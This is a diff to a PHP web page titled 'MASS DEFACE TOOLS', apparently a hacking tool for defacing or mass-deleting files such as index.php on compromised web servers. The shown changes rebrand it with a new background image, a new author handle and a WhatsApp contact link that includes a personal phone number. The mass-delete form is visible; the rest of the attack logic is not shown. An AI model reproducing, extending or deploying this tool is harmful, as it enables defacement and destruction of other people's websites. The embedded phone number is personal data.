@@ -3,7 +3,7 @@
 <title>MASS DEFACE TOOLS</title>
 <style>
 body { 
-    background: url('https://newevolutiondesigns.com/images/freebies/black-wallpaper-30.jpg');
+    background: url('https://1.bp.blogspot.com/-YVIXpgGlQKw/XewVsnHtmuI/AAAAAAAAAQ4/BHZeXHkhyoM2M1SgK2teWAKbqCoW2cCLwCLcBGAsYHQ/s1600/22-38-42-6d9f0c36b9a4e8d1f73c93c9dd8602a3.jpg');
 	background-repeat: no-repeat;
 	background-position: center;
 	background-size: 100% 100%;
@@ -54,13 +54,13 @@ top: 30%;
 }
 </style>
 <div id='wible' align="center">
-<div style="background:transparent;border:2px solid aqua;padding:24px;width:400px;"/>
+<div style="background:transparent;border:2px solid aqua;padding:24px;width:300px;"/>
 <a href='?'><h1>MASS DEFACE TOOLS</h1></a><br />
 <a href='?go=mass'>MASS DEFACE</a> |
 <a href='?go=delet'>MASS DELETE</a>
 </div></head><br />
 <script>
-var text="Created By TubagusNM";
+var text="Created By Rizredvlo7zer0✬";
 var delay=10;
 var currentChar=1;
 var destination="[none]";
@@ -235,7 +235,7 @@ elseif($_GET['go'] == 'delet') {
 	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
 	<input type='submit' name='start' value='Goo!' style='width: 450px;'>
 	</form>";
-		echo"<u><a href='http://facebook.com/Tubagus19.id' target='_blank'>Say hello to me :)</a></u></center>";
+		echo"<u><a href='https://api.whatsapp.com/send?phone=6285745620638&text=' target='_blank'>Say hello to me :)</a></u></center>";
 }
 }
 }
